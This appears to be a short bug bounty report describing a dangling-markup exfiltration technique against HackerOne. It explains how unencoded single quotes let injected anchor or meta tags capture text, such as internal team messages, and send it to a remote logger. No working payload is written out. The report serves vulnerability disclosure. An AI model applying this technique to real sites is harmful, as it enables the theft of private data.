This can happen in the following situation:\n\n1. There's a HTML injection vulnerability\n2. The sensitive data is preceded by the HTML injection vulnerability\n3. After the sensitive data, there's a single quote (could be inserted by the attacker)\n\nDue to these requirements I haven't been able to test it, though I did found some places where it theoretically could work.\n\nThe problem is that HackerOne does not convert single quotes to their HTML entities (\u0026lsquo;), not in their own texts, nor in user-supplied fields (like report title, body, ...). This will make browser interpret the data between the quote and the HTML injection an attribute in some cases. Using anchor tags or meta redirects, we can capture this data using a logger stored at a remote server.\n\n## Example\n\nSay someone has found a way to inject HTML into a comment,  summary or report, he could read the internal team messages.
